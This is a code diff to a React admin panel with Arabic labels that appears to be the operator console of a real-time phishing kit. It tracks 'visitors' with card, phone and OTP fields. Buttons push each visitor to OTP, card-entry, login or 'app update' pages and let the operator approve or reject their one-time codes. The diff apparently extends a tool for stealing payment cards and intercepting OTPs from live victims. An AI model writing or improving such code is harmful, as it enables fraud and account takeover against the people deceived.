@@ -1,7 +1,8 @@
 import { useState, useEffect } from "react";
 import {
   Shield, Users, Wifi, WifiOff, Trash2, Send, ChevronDown, ChevronUp,
-  RefreshCw, LogOut, Eye, EyeOff, CreditCard, Phone, Lock, Globe, Clock
+  LogOut, Eye, EyeOff, CreditCard, Phone, Lock, Globe, Clock,
+  CheckCircle, XCircle, Download
 } from "lucide-react";
 import { adminApi, type Visitor } from "@/lib/api";
 
@@ -26,10 +27,25 @@ function pageLabel(page: string) {
     "انتظار": { label: "انتظار", color: "#f59e0b" },
     "التحقق OTP": { label: "OTP", color: "#ef4444" },
     "OTP - منتظر": { label: "OTP ⏳", color: "#f97316" },
+    "تحديث التطبيق": { label: "تحديث", color: "#0ea5e9" },
   };
   const e = map[page];
   if (e) return <span className="inline-block text-[11px] font-bold rounded-full px-2 py-0.5 text-white" style={{ background: e.color }}>{e.label}</span>;
   return <span className="inline-block text-[11px] font-bold rounded-full px-2 py-0.5 bg-gray-200 text-gray-600">{page || "—"}</span>;
+}
+
+function statusBadge(status: string) {
+  if (status === "approved") return (
+    <span className="inline-flex items-center gap-1 text-[11px] font-bold rounded-full px-2 py-0.5 text-white bg-green-600">
+      <CheckCircle className="w-3 h-3" /> موافق
+    </span>
+  );
+  if (status === "rejected") return (
+    <span className="inline-flex items-center gap-1 text-[11px] font-bold rounded-full px-2 py-0.5 text-white bg-red-600">
+      <XCircle className="w-3 h-3" /> مرفوض
+    </span>
+  );
+  return null;
 }
 
 function StatCard({ label, value, Icon, color }: { label: string; value: number; Icon: any; color: string }) {
@@ -203,6 +219,9 @@ export default function AdminPage() {
                   {/* Page */}
                   {pageLabel(v.page)}
 
+                  {/* Approval status */}
+                  {v.status && statusBadge(v.status)}
+
                   {/* Country */}
                   {v.country && (
                     <div className="flex items-center gap-1">
@@ -264,16 +283,31 @@ export default function AdminPage() {
 
                     {/* Commands */}
                     <div className="space-y-2">
-                      <p className="text-gray-400 text-xs font-black">إرسال أمر:</p>
+                      <p className="text-gray-400 text-xs font-black">توجيه المستخدم:</p>
                       <div className="flex flex-wrap gap-2">
                         <button onClick={() => adminApi.sendCmd(v.id, "redirect:otp")}
                           className="flex items-center gap-1.5 bg-amber-500/20 hover:bg-amber-500/30 border border-amber-500/30 text-amber-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
-                          <Send className="w-3.5 h-3.5" /> طلب OTP
+                          <Send className="w-3.5 h-3.5" /> OTP / رمز الأمان
                         </button>
                         <button onClick={() => adminApi.sendCmd(v.id, "redirect:card")}
                           className="flex items-center gap-1.5 bg-purple-500/20 hover:bg-purple-500/30 border border-purple-500/30 text-purple-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                           <CreditCard className="w-3.5 h-3.5" /> طلب بطاقة
                         </button>
+                        <button onClick={() => adminApi.sendCmd(v.id, "redirect:login")}
+                          className="flex items-center gap-1.5 bg-blue-500/20 hover:bg-blue-500/30 border border-blue-500/30 text-blue-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
+                          ↩ تسجيل الدخول
+                        </button>
+                        <button onClick={() => adminApi.sendCmd(v.id, "redirect:update")}
+                          className="flex items-center gap-1.5 bg-sky-500/20 hover:bg-sky-500/30 border border-sky-500/30 text-sky-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
+                          <Download className="w-3.5 h-3.5" /> تحديث التطبيق
+                        </button>
+                      </div>
+                    </div>
+
+                    {/* OTP approve/reject */}
+                    <div className="space-y-2">
+                      <p className="text-gray-400 text-xs font-black">قرار OTP:</p>
+                      <div className="flex flex-wrap gap-2">
                         <button onClick={() => adminApi.sendCmd(v.id, "otp:approved")}
                           className="flex items-center gap-1.5 bg-green-500/20 hover:bg-green-500/30 border border-green-500/30 text-green-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                           ✓ قبول OTP
@@ -282,9 +316,26 @@ export default function AdminPage() {
                           className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                           ✗ رفض OTP
                         </button>
-                        <button onClick={() => adminApi.sendCmd(v.id, "redirect:login")}
-                          className="flex items-center gap-1.5 bg-blue-500/20 hover:bg-blue-500/30 border border-blue-500/30 text-blue-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
-                          ↩ رجوع للدخول
+                      </div>
+                    </div>
+
+                    {/* Approve / Reject status */}
+                    <div className="space-y-2">
+                      <p className="text-gray-400 text-xs font-black">قرار الطلب:</p>
+                      <div className="flex flex-wrap gap-2">
+                        <button onClick={() => {
+                          adminApi.updateStatus(v.id, "approved");
+                          setVisitors(vs => vs.map(x => x.id === v.id ? { ...x, status: "approved" } : x));
+                        }}
+                          className="flex items-center gap-1.5 bg-green-600/30 hover:bg-green-600/50 border border-green-500/50 text-green-200 font-black text-xs px-4 py-2.5 rounded-xl transition-colors">
+                          <CheckCircle className="w-4 h-4" /> موافق
+                        </button>
+                        <button onClick={() => {
+                          adminApi.updateStatus(v.id, "rejected");
+                          setVisitors(vs => vs.map(x => x.id === v.id ? { ...x, status: "rejected" } : x));
+                        }}
+                          className="flex items-center gap-1.5 bg-red-600/30 hover:bg-red-600/50 border border-red-500/50 text-red-200 font-black text-xs px-4 py-2.5 rounded-xl transition-colors">
+                          <XCircle className="w-4 h-4" /> رفض
                         </button>
                         <button onClick={() => adminApi.delete(v.id).then(() => setVisitors(vs => vs.filter(x => x.id !== v.id)))}
                           className="flex items-center gap-1.5 bg-gray-500/20 hover:bg-gray-500/30 border border-gray-500/30 text-gray-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
